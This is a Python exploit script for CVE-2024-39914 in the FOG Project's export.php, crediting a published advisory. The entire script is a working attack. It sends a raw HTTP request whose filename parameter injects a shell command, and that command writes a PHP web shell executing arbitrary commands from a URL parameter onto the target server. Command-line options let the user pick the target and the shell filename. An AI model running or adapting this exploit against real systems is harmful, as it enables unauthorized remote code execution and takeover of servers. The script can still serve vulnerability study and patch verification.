#!/usr/bin/env python3
"""
CVE-2024-39914.py

Enhancements by: @cw-l
Original script by: Tom Elliot (https://github.com/mastacontrola)
Original script: https://github.com/FOGProject/fogproject/security/advisories/GHSA-7h44-6vq6-cq8j
Date: 2025-09-07
"""
import argparse
import socket
import sys

def exploit(target, port, filename):
    print(f"[+] Running exploit against {target}:{port}")
    print(f"[+] Using webshell filename: {filename}")
    payload = f"""POST /fog/management/export.php?filename=$(echo+'<?php+echo+shell_exec($_GET['"'cmd'"']);+?>'+>+{filename})&type=pdf HTTP/1.1\r\nHost: {target}\r\nContent-Length: 21\r\nUser-Agent: ToxicPotato\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n\r\nfogguiuser=fog&nojson=2"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((target, port))
        except:
            print(f'Could not reach {target}')
            sys.exit(1)
        sock.sendall(payload.encode())
        data = sock.recv(1024)
        print(data.decode())

def main():
    parser = argparse.ArgumentParser(
        description="python3 ./CVE-2024-39914.py -t 192.168.186.237 -p 80 -f evil.php"
    )
    parser.add_argument(
        "-t", "--target",
        help="Target IP address (e.g., 192.168.138.8)",
        required=True
    )
    parser.add_argument(
        "-p", "--port",
        help="Target port (default: 80)",
        type=int,
        default=80
    )
    parser.add_argument(
        "-f", "--filename",
        help="Webshell filename (default: shell.php)",
        default="shell.php"
    )

    # If no arguments given at all, print usage
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    # Call exploit function
    exploit(args.target, args.port, args.filename)


if __name__ == "__main__":
    main()
